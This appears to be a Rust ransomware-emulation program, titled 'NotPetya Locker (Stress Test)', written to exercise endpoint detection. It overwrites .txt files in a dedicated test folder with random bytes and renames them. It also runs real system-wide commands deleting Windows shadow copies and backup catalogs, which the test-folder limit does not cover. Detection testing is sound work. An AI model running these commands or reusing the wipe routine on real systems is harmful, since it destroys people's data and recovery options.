//! Threat: NotPetya Locker (Stress Test)
//! DOES NOT CONTAIN REAL MALWARE. FOR EDR RATE LIMITER TESTING ONLY.

use std::env;
use std::fs::{self, OpenOptions, File};
use std::io::Write;
use std::path::PathBuf;
use std::process::Command;
use std::thread;
use std::sync::Arc;
use rand::Rng;

fn get_test_zone() -> Option<PathBuf> {
    if let Ok(user_profile) = env::var("USERPROFILE") {
        let mut path = PathBuf::from(user_profile);
        path.push("Music");
        path.push("Ransomware_Test_Zone");
        if path.exists() && path.is_dir() {
            return Some(path);
        }
    }
    None
}

fn main() {
    println!("==================================================");
    println!(" [+] NotPetya Payload Executing...");
    println!("==================================================");

    let test_zone = match get_test_zone() {
        Some(path) => path,
        None => {
            println!("[-] Safety Collar: Ransomware_Test_Zone not found in Music directory. Exiting safely.");
            return;
        }
    };

    println!("[*] Target zone identified: {:?}", test_zone);

    // 1. Execute vssadmin
    println!("[*] Executing vssadmin.exe to delete Volume Shadow Copies...");
    if let Ok(mut child) = Command::new("vssadmin.exe").args(&["delete", "shadows", "/all", "/quiet"]).spawn() {
        std::thread::sleep(std::time::Duration::from_secs(2)); // Short sleep
        let _ = child.wait(); // Wait for it to finish
    }

    // 2. Execute wbadmin
    println!("[*] Executing wbadmin.exe to delete Windows Backup catalogs...");
    if let Ok(mut child) = Command::new("wbadmin.exe").args(&["delete", "catalog", "-quiet"]).spawn() {
        std::thread::sleep(std::time::Duration::from_secs(2)); // Short sleep
        let _ = child.wait(); // Wait for it to finish
    }

    // 3. Attempt a dummy write to \Device\HarddiskVolume1 (MBR Ring 0 protection)
    println!("[*] Overwriting Master Boot Record (MBR)...");
    if let Ok(_) = File::open("\\\\.\\PhysicalDrive0") {
        // Read access successful
    }

    let mut files_to_encrypt = Vec::new();
    if let Ok(entries) = fs::read_dir(&test_zone) {
        for entry in entries.filter_map(Result::ok) {
            let path = entry.path();
            if path.is_file() && path.extension().and_then(|s| s.to_str()) == Some("txt") {
                files_to_encrypt.push(path);
            }
        }
    }

    if files_to_encrypt.is_empty() {
        println!("[-] No .txt files found in target zone. Exiting.");
        return;
    }

    let files_arc = Arc::new(files_to_encrypt);
    let mut handles = Vec::new();

    println!("[*] Commencing mass high-entropy encryption...");

    // Spawn a thread for each file to ensure maximum I/O burst
    for file_path in files_arc.iter() {
        let path = file_path.clone();
        let handle = thread::spawn(move || {
            let mut rng = rand::thread_rng();
            // True I/O: Overwrite with random bytes
            if let Ok(mut file) = OpenOptions::new().write(true).open(&path) {
                let mut random_bytes = vec![0u8; 4096];
                rng.fill(&mut random_bytes[..]);
                let _ = file.write_all(&random_bytes);
                let _ = file.sync_all();
            }

            // Rename
            let mut new_path = path.clone();
            new_path.set_extension("notpetya");
            let _ = fs::rename(&path, &new_path);
        });
        handles.push(handle);
    }

    for handle in handles {
        let _ = handle.join();
    }

    println!("[+] Target system destroyed and unbootable.");
    
    // Sustained Execution (The Cryo-Stasis Target)
    std::thread::sleep(std::time::Duration::from_secs(20));
}